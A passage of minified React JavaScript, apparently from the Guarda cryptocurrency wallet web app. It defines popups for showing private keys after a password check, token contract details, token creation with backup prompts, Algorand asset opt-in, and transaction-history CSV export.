            CE.zv)(v) || (0,
            CE.e1)(v) || (0,
            CE.dh)(v)) && Object.entries(v).map((e => {
                let[t,a] = e;
                return "privateKey" === t ? !_ && O.createElement("div", {
                    className: xg.lineInformation,
                    key: `key${a}`
                }, O.createElement("div", {
                    className: xg.label
                }, t, ":"), O.createElement("div", {
                    className: xg.labelInfo
                }, O.createElement("span", null, a), O.createElement(button_copy, {
                    text: a,
                    className: xg.buttonCopy
                }, (e => e ? O.createElement("img", {
                    className: xg.icon,
                    src: Ag,
                    alt: "Copy"
                }) : O.createElement("img", {
                    src: Ng,
                    alt: "Copy"
                }))), O.createElement("img", {
                    src: Tg,
                    alt: "",
                    className: xg.iconQRCode,
                    onClick: () => E(a)
                }))) : O.createElement("div", {
                    className: xg.lineInformation,
                    key: `key${a}`
                }, O.createElement("div", {
                    className: xg.label
                }, t, ":"), O.createElement("div", {
                    className: xg.labelInfo
                }, O.createElement("span", null, a), O.createElement(button_copy, {
                    text: a,
                    className: xg.buttonCopy
                }, (e => e ? O.createElement("img", {
                    className: xg.icon,
                    src: Ag,
                    alt: "Copy"
                }) : O.createElement("img", {
                    src: Ng,
                    alt: "Copy"
                }))), O.createElement("img", {
                    src: Tg,
                    alt: "",
                    className: xg.iconQRCode,
                    onClick: () => E(a)
                })))
            }
            )), O.createElement("div", {
                className: xg.buttonWrapper
            }, O.createElement(Yl, {
                color: "blue",
                onClick: handleClose,
                className: xg.okButton
            }, "Ok"))), !m && O.createElement("div", {
                className: xg.lineInformation
            }, O.createElement("div", {
                className: "relative"
            }, O.createElement("div", {
                className: xg.linePassword
            }, O.createElement(Ea, {
                ref: h,
                autoFocus: !0,
                type: "password",
                placeholder: "Password",
                value: o,
                onChange: e => {
                    let {target: {value: t}} = e;
                    return c(t)
                }
                ,
                className: xg.inputPassword,
                onEnter: handleCheckShowPassword
            }), O.createElement(Yl, {
                color: "blue",
                onClick: handleCheckShowPassword,
                className: xg.button
            }, "Show"), O.createElement("div", {
                className: xg.fancyLabel
            }, "Guarda password")), u && O.createElement("div", {
                className: xg.passwordError
            }, "Wrong password. Please try again"))))))
        }
          , Ig = PopupPrivateKeys
          , Pg = a.p + "3fdd0c1f34bc8b0e60e8bc99435cbb51.svg"
          , Lg = undefined
          , popup_smart_contract = e => {
            const {ticker: t, smartContract: a} = e
              , n = `https://etherscan.io/token/${a}`
              , handleClose = () => {
                e.onClose()
            }
            ;
            return O.createElement(aa, {
                visible: e.isVisible,
                onClose: handleClose,
                width: 450
            }, O.createElement("div", {
                className: xg.infoWrapper
            }, O.createElement("h1", {
                className: xg.h1
            }, null == t ? void 0 : t.toUpperCase()), O.createElement("div", {
                className: xg.pkBlock
            }, O.createElement("div", {
                className: xg.lineInformation
            }, O.createElement("span", {
                className: xg.description
            }, "The token contract specifies the location of the program in the blockchain (smart contract), which manages the logic of tokens and keeps the book of it’s holders."), O.createElement("div", {
                className: xg.label
            }, "Token contract:"), O.createElement("div", {
                className: xg.labelInfo
            }, O.createElement("span", null, a), O.createElement(button_copy, {
                text: n,
                className: xg.buttonCopy
            }, (e => e ? O.createElement("img", {
                className: xg.icon,
                src: Ag,
                alt: "Copy"
            }) : O.createElement("img", {
                src: Ng,
                alt: "Copy"
            }))), O.createElement("a", {
                href: n,
                target: "_blank",
                rel: "noreferrer noopener",
                className: xg.iconExplorer
            }, O.createElement("img", {
                src: Pg,
                alt: "Open in explorer",
                height: 16,
                width: 16
            })))))))
        }
          , PopupCreateToken = e => {
            let {isVisible: t, onClose: a, token: n, parentWallet: r, onChangeUnclosable: l, unclosable: s} = e;
            const i = (0,
            $.I0)()
              , [o,c] = (0,
            O.useState)(lp.CREATED)
              , [u,d] = (0,
            O.useState)(!1)
              , [m,p] = (0,
            O.useState)(void 0)
              , [f,E] = (0,
            O.useState)(!1)
              , [h,g] = (0,
            O.useState)(!1)
              , [y,v] = (0,
            O.useState)("")
              , [_,w] = (0,
            O.useState)(!1)
              , b = (0,
            O.useRef)(null)
              , {createNewCoinOrToken: k} = useCreateWalletAndGoTo({
                noDownloadBackup: !0
            });
            (0,
            O.useEffect)(( () => {
                const e = undefined;
                (async () => {
                    d(!0);
                    const e = await k({
                        wallet: n,
                        isNewToken: !0,
                        isNewWallet: !1,
                        parentWallet: r
                    });
                    e && e.address && p(e);
                    d(!1);
                    return e
                }
                )()
            }
            ), []);
            const checkPassword = e => {
                var t;
                const a = undefined;
                if (i(checkMasterPassword(y)))
                    e();
                else {
                    v("");
                    null === (t = b.current) || void 0 === t || t.focus();
                    w(!0);
                    setTimeout(( () => w(!1)), 3e3)
                }
            }
              , handleCheckShowPassword = () => {
                checkPassword(( () => E(!0)))
            }
              , forceDownload = async () => {
                await i(handleDownload(Sm.FORCE));
                i(removeNotifyBackup());
                l(!1);
                a()
            }
              , skipDownload = async () => {
                i(ie.saveBackup());
                const e = undefined;
                if (await i(hasSetting(Sm.AFTER_CREATE_WALLET)))
                    c(lp.SKIP);
                else {
                    l(!1);
                    a()
                }
            }
              , handleCheckSkipPassword = () => {
                checkPassword(( () => {
                    i(ie.saveBackup());
                    l(!1);
                    a()
                }
                ))
            }
              , handleBackSkiping = () => {
                c(lp.CREATED)
            }
            ;
            return O.createElement(aa, {
                visible: t,
                onClose: a,
                width: 450,
                unclosable: s
            }, O.createElement("div", {
                className: np
            }, u && !m && O.createElement("div", {
                className: rp
            }, O.createElement("p", null, "Loading"), " ", O.createElement(loader, {
                visible: !0,
                width: 30
            })), o === lp.SKIP && O.createElement("div", {
                className: Qm
            }, O.createElement("h2", null, "Confirm skipping backup download"), O.createElement("p", null, "We strongly recommend ALWAYS allowing backup download.It ensures that you never lose your wallet after logout.", O.createElement("br", null), O.createElement("br", null), "If you are skipping backup download after creating the wallet, please remember to download The updated backup file before logout.Updated backup is marked by red point in the menu on the top."), O.createElement("div", {
                className: qm
            }, O.createElement("div", {
                className: ep
            }, O.createElement(Ea, {
                ref: b,
                autoFocus: !0,
                type: "password",
                placeholder: "Password",
                value: y,
                onChange: e => {
                    let {target: {value: t}} = e;
                    return v(t)
                }
                ,
                className: Jm,
                onEnter: handleCheckSkipPassword
            }), O.createElement(Yl, {
                color: "red",
                onClick: handleCheckSkipPassword
            }, "Skip download")), _ && O.createElement("div", {
                className: tp
            }, "Wrong password. Please try again")), O.createElement("div", {
                className: ap,
                onClick: handleBackSkiping
            }, "Back")), !u && m && o === lp.CREATED && O.createElement("div", null, O.createElement("div", {
                className: Xm
            }, O.createElement("h2", {
                id: "addWalletCurrencyTitle"
            }, m.currency.toUpperCase(), " token and ", r.currency.toUpperCase(), " wallet have been created"), O.createElement("p", {
                className: "textCenter"
            }, "Kindly find it highlighted in the menu on the left along with the other Guarda wallets."), O.createElement("div", {
                className: qm
            }, O.createElement("h4", null, "Address:"), O.createElement("span", null, m.address)), f && O.createElement("div", null, O.createElement(WalletPrivateKey, {
                privateKey: m.privateKey
            })), !f && O.createElement("div", {
                className: qm
            }, !h && O.createElement("div", {
                className: qm
            }, O.createElement("span", null, O.createElement("span", {
                className: "dashedNormal",
                onClick: () => g(!0)
            }, "Show private Key"))), h && O.createElement("div", {
                className: "relative"
            }, O.createElement("div", {
                className: ep
            }, O.createElement(Ea, {
                autoFocus: !0,
                type: "password",
                placeholder: "Password",
                value: y,
                onChange: e => {
                    let {target: {value: t}} = e;
                    return v(t)
                }
                ,
                className: Jm,
                onEnter: handleCheckShowPassword
            }), O.createElement(Yl, {
                color: "blue",
                onClick: handleCheckShowPassword
            }, "Show")), _ && O.createElement("div", {
                className: tp
            }, "Wrong password. Please try again"))), O.createElement("div", {
                className: Ym
            }, O.createElement(Yl, {
                color: "blue",
                onClick: forceDownload,
                id: "addWalletDownloadBackup"
            }, "Download backup"), O.createElement("br", null), O.createElement(Yl, {
                color: "simple",
                onClick: skipDownload,
                id: "addWalletSkip"
            }, "Skip download"))))))
        }
          , Fg = PopupCreateToken
          , Wg = {
            root: "popup-create-asa-tokens_root_3xEEn",
            header: "popup-create-asa-tokens_header_1L_1H",
            headerDescription: "popup-create-asa-tokens_headerDescription_UNQVh",
            description: "popup-create-asa-tokens_description_1ef01",
            inputDescriptionContainer: "popup-create-asa-tokens_inputDescriptionContainer_2q8mh",
            error: "popup-create-asa-tokens_error_2D3yt",
            wrapImage: "popup-create-asa-tokens_wrapImage_3K2oz",
            logo: "popup-create-asa-tokens_logo_2ZS92",
            ticker: "popup-create-asa-tokens_ticker_iLKA5",
            item: "popup-create-asa-tokens_item_KVHCg",
            coinTitle: "popup-create-asa-tokens_coinTitle_3XoMX",
            coinId: "popup-create-asa-tokens_coinId_1REr6",
            selector: "popup-create-asa-tokens_selector_2JGt2",
            asset: "popup-create-asa-tokens_asset_UWb9i"
        }
          , Rg = O.memo((e => {
            let {id: t, icon: a, title: n, subtitle: r} = e;
            return O.createElement(O.Fragment, null, a && O.createElement("div", {
                className: Wg.wrapImage
            }, O.createElement("img", {
                className: Wg.logo,
                src: a,
                alt: n
            })) || O.createElement("div", {
                className: Wg.wrapImage
            }, O.createElement(IconCurrency, {
                currency: r
            })), O.createElement("div", {
                className: Wg.item
            }, O.createElement("div", {
                className: Wg.coinTitle
            }, n, r && O.createElement("span", {
                className: Wg.ticker
            }, r.toUpperCase())), O.createElement("div", {
                className: Wg.coinId
            }, t)))
        }
        ));
        function PopupCreateAsaTokens(e) {
            let {isVisible: t, onClose: a, wallet: n, assetWallet: r} = e;
            const [l,s] = (0,
            O.useState)("")
              , [i,o] = (0,
            O.useState)([])
              , [c,u] = (0,
            O.useState)(void 0)
              , [d,m] = (0,
            O.useState)({})
              , [p,f] = (0,
            O.useState)("")
              , [E,h] = (0,
            O.useState)(!1)
              , [g] = use_fee(n, n);
            (0,
            O.useEffect)(( () => {
                !async function() {
                    const e = await Se.Z.getApiByCurrency("algo");
                    m(e)
                }()
            }
            ), []);
            (0,
            O.useEffect)(( () => {
                !async function() {
                    if (d.searchAssets) {
                        const e = await d.searchAssets(l.length > 2 && l || "tether")
                          , t = null == e ? void 0 : e.map((e => {
                            let {id: t, logoUrl: a, name: n, ticker: r} = e;
                            return {
                                id: String(t),
                                icon: a,
                                title: n,
                                subtitle: r
                            }
                        }
                        ));
                        o(t || [])
                    }
                }()
            }
            ), [l, d]);
            async function handlePressApprove() {
                if (c || r) {
                    const e = {
                        addressFrom: n.address,
                        privateKey: n.privateKey,
                        assetId: Number((null == c ? void 0 : c.id) || Number(r.smartContract)),
                        totalBalance: n.balance,
                        fee: g
                    };
                    try {
                        h(!0);
                        await d.optInAsset(e);
                        h(!1)
                    } catch (e) {
                        h(!1);
                        return f(e.message)
                    }
                    a()
                }
            }
            function handleSearchAsset(e) {
                s(e)
            }
            function handleSelectAsset(e) {
                u(e)
            }
            return O.createElement(aa, {
                visible: t,
                onClose: a,
                width: 500
            }, O.createElement("div", {
                className: Wg.root
            }, O.createElement("span", {
                className: Wg.header
            }, "Add ASA token"), r ? null : O.createElement("span", {
                className: Wg.headerDescription
            }, "Select ASA token to add"), r ? O.createElement("div", {
                className: Wg.asset
            }, O.createElement(Rg, {
                id: r.smartContract,
                title: r.title,
                subtitle: r.ticker
            })) : O.createElement("div", {
                className: Wg.selector
            }, O.createElement(Lp, {
                selected: c,
                placeholder: "Token ID",
                emptyPlaceholder: "",
                externalHandleSearch: handleSearchAsset,
                renderItem: Rg,
                onChange: handleSelectAsset,
                items: i
            })), O.createElement("div", {
                className: Wg.inputDescriptionContainer
            }, O.createElement("span", {
                className: Wg.inputDescription
            }, "Transaction fee: ", g, " ALGO"), O.createElement("span", {
                className: Wg.error
            }, p)), O.createElement("span", {
                className: Wg.description
            }, "Adding an asset requires sending a transaction with a minimum transaction fee."), O.createElement("br", null), O.createElement("br", null), O.createElement(Yl, {
                color: "blue",
                onClick: handlePressApprove,
                isLoading: E
            }, "Approve transaction")))
        }
        var Bg = a(95323);
        const Og = "KIN_ACTIVATION_TYPE"
          , Dg = undefined
          , Mg = "QTUM_STAKE_TYPE"
          , Ug = undefined
          , Gg = "CLO_STAKE_TYPE"
          , Vg = undefined
          , Kg = "CLO_REWARD_TYPE"
          , Hg = undefined
          , zg = "CLO_WITHDRAW_TYPE"
          , jg = undefined
          , $g = "KMD_CLAIM_TYPE"
          , Zg = undefined
          , Yg = "ETH_STAKE_TYPE"
          , qg = undefined
          , Xg = "GETH_DEPOSIT_TYPE"
          , Qg = undefined
          , Jg = "NOW_STAKE_TYPE"
          , ey = undefined
          , ty = "NOW_UNSTAKE_TYPE"
          , ay = undefined
          , ny = undefined
          , ry = undefined
          , ly = "ADA_STAKE_TYPE"
          , sy = undefined
          , iy = "ADA_REWARD_TYPE"
          , oy = undefined
          , cy = "ZIL_STAKE_TYPE"
          , uy = undefined
          , dy = "ZIL_REWARD_TYPE"
          , my = undefined
          , py = "ZIL_UNSTAKE_TYPE"
          , fy = undefined
          , Ey = "ZIL_WITHDRAW_TYPE"
          , hy = undefined
          , gy = "XTZ_STAKE_TYPE"
          , yy = undefined
          , vy = "XTZ_REWARD_TYPE"
          , _y = undefined
          , wy = "NEO_CLAIM_TYPE"
          , by = undefined
          , ky = "ONE_STAKE_TYPE"
          , Sy = undefined
          , Cy = "ONE_UNSTAKE_TYPE"
          , Ny = undefined
          , Ty = "ONE_REWARD_TYPE"
          , Ay = undefined
          , xy = "GUARDA_REF_REWARD_TYPE"
          , Iy = undefined
          , Py = "ATOM_STAKE_TYPE"
          , Ly = undefined
          , Fy = "ATOM_UNSTAKE_TYPE"
          , Wy = undefined
          , Ry = "ATOM_REWARD_TYPE"
          , By = undefined
          , Oy = "TRX_STAKE_TYPE"
          , Dy = undefined
          , My = "TRX_CLAIM_TYPE"
          , Uy = undefined
          , Gy = "TRX_UNSTAKE_TYPE"
          , Vy = undefined
          , Ky = "TRX_UNFREEZE_TYPE"
          , Hy = undefined
          , zy = "TRX_DELEGATE_TYPE"
          , jy = undefined
          , $y = "TRX_UNDELEGATE_TYPE"
          , Zy = undefined
          , Yy = "TRX_UNSTAKE_CANCEL_TYPE"
          , qy = undefined
          , Xy = "XDC_TOKEN_TRANSFER_FAIL_TYPE"
          , Qy = undefined
          , Jy = "HBAR_TOKEN_CREATION_TYPE"
          , ev = undefined
          , tv = "HBAR_ADDRESS_CREATION_TYPE"
          , av = undefined
          , nv = "HBAR_OPERATION_TYPE"
          , rv = undefined
          , lv = "HBAR_UNKNOWN_TYPE"
          , sv = undefined
          , iv = "HBAR_TOKEN_ADD_FAIL_TYPE"
          , ov = undefined
          , cv = "HBAR_TOKEN_ADD_TYPE"
          , uv = undefined
          , dv = "XRP_CLOSE_ACCOUNT_TYPE"
          , mv = undefined
          , pv = "BUY_TX_TYPE"
          , fv = undefined
          , Ev = "EXCHANGE_FINISHED_EXTRA_TYPE"
          , hv = undefined
          , gv = "EXCHANGE_FINISHED_TYPE"
          , yv = undefined
          , vv = "EXCHANGE_FAILED_TYPE"
          , _v = undefined
          , wv = "EXCHANGE_REFUNDED_TYPE"
          , bv = undefined
          , kv = "EXCHANGE_WAIT_TYPE"
          , Sv = undefined
          , Cv = "EXCHANGE_EXCHANGING_TYPE"
          , Nv = undefined
          , Tv = "OUTGOING_FIO_WAITING_TYPE"
          , Av = undefined
          , xv = "INCOMING_FIO_ACTION_REQUIRED_TYPE"
          , Iv = undefined
          , Pv = "INCOMING_FIO_APPROVED_TYPE"
          , Lv = undefined
          , Fv = "OUTGOING_FIO_APPROVED_TYPE"
          , Wv = undefined
          , Rv = "INCOMING_FIO_REJECTED_TYPE"
          , Bv = undefined
          , Ov = "OUTGOING_FIO_REJECTED_TYPE"
          , Dv = undefined
          , Mv = "INCOMING_FIO_SENT_TYPE"
          , Uv = undefined
          , Gv = "OUTGOING_FIO_SENT_TYPE"
          , Vv = undefined
          , Kv = "SELL_KYC_VERIFICATION_TYPE"
          , Hv = undefined
          , zv = "SELL_ACTION_REQUIRED_TYPE"
          , jv = undefined
          , $v = "SELL_TRANSACTION_REFUNDED_TYPE"
          , Zv = undefined
          , Yv = "SELL_TRANSACTION_FAILED_TYPE"
          , qv = undefined
          , Xv = "SELL_CRYPTO_SENT_TYPE"
          , Qv = undefined
          , Jv = "SELL_FUNDS_SENT_TYPE"
          , e_ = undefined
          , t_ = "MULTISIG_CREATED_TYPE"
          , a_ = undefined
          , n_ = "MULTISIG_APPROVED_TYPE"
          , r_ = undefined
          , l_ = "MULTISIG_ACTION_REQUIRED_TYPE"
          , s_ = undefined
          , i_ = "HASH_LINK_TYPE"
          , o_ = {
            [i_]: "",
            [l_]: "Multisig transaction. Action required",
            [n_]: "Multisig transaction. Approved",
            [t_]: "Multisig created",
            [Jv]: "Sell: Fiat funds sent to your card",
            [Xv]: "Sell: Crypto transaction sent",
            [Yv]: "Sell: Transaction failed. Kindly contact support for refund",
            [$v]: "Sell: Transaction refunded",
            [zv]: "Sell: Action required",
            [Kv]: "Sell: KYC verification in progress",
            [Gv]: "Outgoing FIO-request. Sent",
            [Mv]: "Incoming FIO-request. Sent",
            [Ov]: "Outgoing FIO-request. Rejected",
            [Rv]: "Incoming FIO-request. Rejected",
            [Fv]: "Outgoing FIO-request. Approved",
            [Pv]: "Incoming FIO-request. Approved",
            [xv]: "Incoming FIO-request. Action required",
            [Tv]: "Outgoing FIO-request. Waiting",
            [Cv]: "Exchanging",
            [kv]: "Waiting funds to secure the exchange",
            [wv]: "Exchange refunded",
            [vv]: "Exchange failed",
            [gv]: "Exchanged",
            [Ev]: "Exchanged",
            [pv]: "Crypto Purchase",
            [dv]: "Close XRP account",
            [cv]: "Adding Hedera token",
            [iv]: "Adding Hedera token: failed",
            [lv]: "Hedera Unknown transaction type",
            [nv]: "Hedera operation",
            [tv]: "Hedera address creation",
            [Jy]: "Hedera token creation",
            [Xy]: "Sending XDC tokens: failed",
            [Yy]: "TRON unstake cancellation",
            [$y]: "TRON resources undelegating",
            [zy]: "TRON resources delegating",
            [Ky]: "TRON unfreezed staking refund",
            [Gy]: "TRON unstaking",
            [My]: "TRON claim rewards",
            [Oy]: "TRON staking",
            [Ry]: "Cosmos claim reward",
            [Fy]: "Cosmos staking refund",
            [Py]: "Cosmos delegation",
            [xy]: "Guarda referral reward",
            [Ty]: "ONE staking reward",
            [Cy]: "ONE staking refund",
            [ky]: "ONE delegation",
            [wy]: "Gas claim",
            [gy]: "Tezos delegation",
            [vy]: "Tezos staking reward",
            [Og]: "Kin wallet activation",
            [Mg]: "QTUM staking",
            [Gg]: "CLO delegation",
            [Kg]: "CLO rewards claim",
            [zg]: "CLO stake withdraw & rewards claim",
            [$g]: "Komodo claim",
            [Yg]: "ETH delegation",
            [Xg]: "GETH deposit",
            [Jg]: "NOW staking",
            [ty]: "NOW unstaking",
            ["NOW_REWARD_TYPE"]: "NOW staking reward",
            [ly]: "ADA staking",
            [iy]: "ADA staking reward",
            [cy]: "ZIL staking",
            [dy]: "ZIL staking reward",
            [py]: "ZIL unstaking",
            [Ey]: "ZIL withdrawal"
        }
          , getTransactionType = e => {
            if (isKinActivation(e))
                return Og;
            if (isQtumStake(e))
                return Mg;
            if (isCloStaking(e))
                return Gg;
            if (isCloStakingReward(e))
                return Kg;
            if (isCloStakingWithdraw(e))
                return zg;
            if (isKmdClaim(e))
                return $g;
            if (isEthStaking(e))
                return Yg;
            if (isGethDeposit(e))
                return Xg;
            if (isTxNowFreeze(e))
                return Jg;
            if (isTxNowUnFreeze(e))
                return ty;
            if (isTxNowReward(e))
                return ty;
            if (isAdaDelegation(e))
                return ly;
            if (isAdaWithdraw(e))
                return iy;
            if (isZilStaking(e))
                return cy;
            if (isZilWithdrawStakeRewards(e))
                return dy;
            if (isZilWithdrawStakeAmt(e))
                return py;
            if (isZilCompleteWithdrawal(e))
                return Ey;
            if (isXtzDelegation(e))
                return gy;
            if (isXtzStakingReward(e))
                return vy;
            if (isNeoClaim(e))
                return wy;
            if (isOneDelegate(e))
                return ky;
            if (isOneUnDelegate(e))
                return Cy;
            if (isOneReward(e))
                return Ty;
            if (isRewardForRefProgr(e))
                return xy;
            if (isAtomDelegate(e))
                return Py;
            if (isAtomUndelegate(e))
                return Fy;
            if (isAtomReward(e))
                return Ry;
            if (isTrxStaking(e))
                return Oy;
            if (isTrxClaiming(e))
                return My;
            if (isTrxUnstaking(e))
                return Gy;
            if (isTrxWithdrawUnfreezedStaking(e))
                return Ky;
            if (isTrxDelegating(e))
                return zy;
            if (isTrxUndelegating(e))
                return $y;
            if (isTrxCancelUnstake(e))
                return Yy;
            if (isXDCTokenTransfer(e) && e.isError)
                return Xy;
            if (isHbarTokenCreation(e))
                return Jy;
            if (isHbarAccountCreation(e))
                return tv;
            if (isHbarBlockchainFeeTransaction(e))
                return nv;
            if (isHbarUnknown(e))
                return lv;
            if (isHbarTokenAssociate(e) && null != e && e.isError)
                return iv;
            if (isHbarTokenAssociate(e) && (null == e || !e.isError))
                return cv;
            if (isXrpCloseAccount(e))
                return dv;
            if (isBuy(e))
                return pv;
            if (isExchange(e)) {
                var t, a, n, r;
                return isFinishedExchange(e) ? isExtraAmount(e) ? Ev : gv : e.extra && "failed" === (null === (t = e.extra) || void 0 === t ? void 0 : t.status) ? vv : e.extra && "refunded" === (null === (a = e.extra) || void 0 === a ? void 0 : a.status) ? wv : e.extra && "waiting" === (null === (n = e.extra) || void 0 === n ? void 0 : n.status) && null !== (r = e.extra) && void 0 !== r && r.dustInvoiceId ? kv : Cv
            }
            if (isFio(e)) {
                if (!("requested" !== e.status && "fio-pending" !== e.type || e.isIncoming))
                    return Tv;
                if (("requested" === e.status || "fio-pending" === e.type) && e.isIncoming)
                    return xv;
                if ("fio-approved" === e.type)
                    return e.isIncoming ? Pv : Fv;
                if ("rejected" === e.status)
                    return e.isIncoming ? Rv : Ov;
                if ("sent_to_blockchain" === e.status)
                    return e.isIncoming ? Mv : Gv
            }
            if (isSell(e)) {
                var l, s, i, o;
                if (isSellKysStatus(e) || isSellInitialStatus(e))
                    return Kv;
                if (isSellPendingStatus(e))
                    return zv;
                if ("refund" === (null === (l = getExtra(e)) || void 0 === l ? void 0 : l.status))
                    return $v;
                if ("reject" === (null === (s = getExtra(e)) || void 0 === s ? void 0 : s.status))
                    return Yv;
                if ("sent" === (null === (i = getExtra(e)) || void 0 === i ? void 0 : i.status))
                    return Xv;
                if ("success" === (null === (o = getExtra(e)) || void 0 === o ? void 0 : o.status))
                    return Jv
            }
            if (isMultisig(e))
                return t_;
            if (isMultisigTxs(e)) {
                var c;
                const t = null === (c = e.states) || void 0 === c ? void 0 : c.find((e => e.transactionHash))
                  , a = undefined;
                return (t ? t.transactionHash : null) ? n_ : l_
            }
            const u = undefined;
            return getTxHashLink(e, e.hash || void 0) && e.hash ? i_ : null
        }
          , c_ = {
            start: [0, 0, 0, 0],
            finish: [23, 59, 59, 999]
        };
        function getTimestamp(e) {
            let t = !(arguments.length > 1 && void 0 !== arguments[1]) || arguments[1];
            const a = new Date(e.year,e.month - 1,e.day)
              , n = t ? c_.start : c_.finish;
            a.setHours(n[0], n[1], n[2], n[3]);
            return a.getTime()
        }
        function getUTCDateAndTime(e) {
            const t = new Date(e)
              , a = undefined
              , n = undefined
              , r = undefined
              , l = undefined
              , s = undefined
              , i = undefined
              , o = undefined
              , c = undefined
              , u = undefined;
            return {
                dateUTC: t.getUTCDate() + "." + (t.getUTCMonth() + 1) + "." + t.getUTCFullYear(),
                timeUTC: t.getUTCHours() + ":" + t.getUTCMinutes() + ":" + t.getUTCSeconds() + "." + t.getUTCMilliseconds()
            }
        }
        function getCSVRaw(e) {
            var t, a, n;
            const r = getTransactionType(e)
              , {dateUTC: l, timeUTC: s} = getUTCDateAndTime(e.timestamp)
              , i = e.family || (null === (t = e.extra) || void 0 === t ? void 0 : t.familyFrom) || e.currencyFrom
              , o = e.family || (null === (a = e.extra) || void 0 === a ? void 0 : a.familyTo) || e.currencyFrom
              , c = getTxHashLink(e, null !== (n = e.hash) && void 0 !== n ? n : void 0, e.currencyFrom, i);
            return [r, l, s, i, e.currencyFrom, e.addressFrom, o, e.currencyTo, e.addressTo, e.isIncoming, e.amount, e.isIncoming ? "" : e.fee, c].join(",")
        }
        function getDefaultRange() {
            const e = (0,
            Bg.P6)("en")
              , t = new Date
              , a = new Date(t);
            a.setMonth(t.getMonth() - 1);
            const n = undefined
              , r = undefined;
            return {
                defaultFrom: {
                    day: a.getDate(),
                    month: a.getMonth() + 1,
                    year: a.getFullYear()
                },
                defaultTo: e.getToday()
            }
        }
        const u_ = "popup-history-export-csv_fadeArrowFlipped_37AWg"
          , d_ = "popup-history-export-csv_fadeCalendar_EdCzz"
          , m_ = "popup-history-export-csv_fadeTextToCenter_1fgsy"
          , p_ = "popup-history-export-csv_FadeContentToCenter_8Y8t6"
          , f_ = "popup-history-export-csv_container_TbMEU"
          , E_ = "popup-history-export-csv_calendar_2GdjL"
          , h_ = "popup-history-export-csv_Calendar__footer_2TlO3"
          , g_ = "popup-history-export-csv_errorWrapper_cxY0e"
          , y_ = "popup-history-export-csv_calendarRangeBetween_1AyoI"
          , v_ = "popup-history-export-csv_today_18uNX"
          , __ = "popup-history-export-csv_closeButton_1R_NG"
          , w_ = "popup-history-export-csv_exportButton_3Rgak"
          , PopupHistoryExportCSV_PopupHistoryExportCSV = e => {
            const t = (0,
            $.v9)(Eu)
              , {defaultFrom: a, defaultTo: n} = getDefaultRange()
              , [r,l] = (0,
            O.useState)("")
              , [s,i] = (0,
            O.useState)({
                from: a,
                to: n
            })
              , handleClose = () => {
                e.onClose()
            }
              , handleExport = () => {
                var e, a;
                null !== (e = s.from) && void 0 !== e && e.day && null !== (a = s.to) && void 0 !== a && a.day || l("You must select a period");
                cc.$.send(cc.d.HISTORY_EXPORT_CSV_CLICK);
                const n = getTimestamp(s.from)
                  , r = getTimestamp(s.to, !1)
                  , i = t.filter((e => e.timestamp >= n && e.timestamp <= r));
                let o = "Type,Date,Time,Network From,Currency From,From,Network To,Currency To,To,Incoming,Amount,Fee,Hash\n";
                i.forEach((e => {
                    const t = getCSVRaw(e);
                    o += `${t}\r\n`
                }
                ));
                const c = new Blob([o],{
                    type: "text/csv;charset=utf-8;"
                })
                  , u = URL.createObjectURL(c)
                  , d = document.createElement("a");
                d.setAttribute("href", u);
                d.setAttribute("download", `history-export-${date_format(new Date, "dd-mm-yyyy")}.csv`);
                document.body.appendChild(d);
                d.click();
                URL.revokeObjectURL(u);
                document.body.removeChild(d)
            }
            ;
            return O.createElement(aa, {
                visible: e.isVisible,
                onClose: handleClose,
                width: 450,
                className: f_
            }, O.createElement(Bg.f, {
                value: s,
                onChange: e => {
                    l("");
                    i(e)
                }
                ,
                shouldHighlightWeekends: !0,
                maximumDate: n,
                colorPrimary: ha.colorBluePrimary,
                colorPrimaryLight: ha.colorBluePrimary,
                calendarClassName: E_,
                calendarRangeBetweenClassName: y_,
                calendarTodayClassName: v_
            }), O.createElement("div", null, O.createElement(Yl, {
                color: "blue",
                onClick: handleExport,
                className: w_
            }, "Export CSV"), O.createElement(Yl, {
                color: "blue",
                onClick: handleClose,
                className: __
            }, "Close")), r && O.createElement(ui_message, {
                type: "error"
            }, r))
        }
          , b_ = {
            "create-eos": EosCreateAccountPopup,
            "custom-token": AE,
            "push-notifications": popup_push_notifications,
            "create-multisig": bg,
            private: Ig,
            "import-or-create": popup_import_or_create,
            "import-xmr": NE,
            "smart-contract": popup_smart_contract,
            "create-token": Fg,
            "create-asa-tokens": PopupCreateAsaTokens,
            "history-export-csv": PopupHistoryExportCSV_PopupHistoryExportCSV
        }
          , k_ = undefined
          , consumer = () => O.createElement(Vt.Consumer, null, (e => {
            let {popupType: t, popupParams: a, close: n} = e;
            if (!t)
                return null;
            const r = b_[t]
              , l = undefined
              , s = {
                ...a,
                ...{
                    onClose: n,
                    isVisible: !0
                }
            };
            return O.createElement(r, s)
        }
        ));
        ft.on("logout", (e => {
            let {dispatch: t} = e;
            t(Ut())
        }
        ));
        const PopupProvider = e => {
            const t = (0,
            $.I0)()
              , a = {
                popupType: (0,
                $.v9)(bt),
                popupParams: (0,
                $.v9)(kt),
                open: (e, a) => {
                    t(Mt({
                        popupType: e,
                        popupParams: null != a ? a : {}
                    }))
                }
                ,
                close: () => {
                    t(Ut())
                }
            };
            return O.createElement(O.Fragment, null, O.createElement(Vt.Provider, {
                value: a
            }, O.createElement(consumer, null), e.children))
        }
          , S_ = PopupProvider;
        var C_ = a(11228);
        const N_ = 3e5
          , T_ = (0,
        _t.P1)([kd.f5, kd.xs], ( (e, t) => {
            const a = undefined;
            return [e, t]
        }
        ))
          , A_ = (0,
        _t.P1)([kd.jl, kd.xs], ( (e, t) => {
            const a = undefined;
            return [Object.entries(e).map((e => {
                let[t,a] = e;
                return {
                    family: t,
                    extraIdentifiers: a
                }
            }
            )), t]
        }
        ))
          , UsdRatesUpdater = () => {
            const e = (0,
            $.I0)()
              , t = (0,
            $.v9)(Bo);
            (0,
            O.useEffect)(( () => {
                !0 !== t && e((0,
                C_.CA)())
            }
            ), []);
            return null
        }
          , CoinRatesUpdater = () => {
            const e = (0,
            $.I0)()
              , t = (0,
            $.v9)(T_)
              , a = (0,
            $.v9)(Bo)
              , n = (0,
            O.useRef)()
              , r = (0,
            O.useCallback)(( (t, a) => {
                0 !== t.length && e((0,
                C_.o$)(t, a))
            }
            ), [e])
              , l = (0,
            O.useCallback)(throttle(Jn()(r, {
                cacheKey: e => {
                    let[t,a] = e;
                    return [t.length, ...a].join()
                }
                ,
                maxAge: 3e4
            }), 300), [r]);
            (0,
            O.useEffect)(( () => {
                !0 !== a && l(...t)
            }
            ), [l, JSON.stringify(t), a]);
            (0,
            O.useEffect)(( () => {
                !0 !== a && (n.current = () => r(...t))
            }
            ), [r, JSON.stringify(t), a]);
            (0,
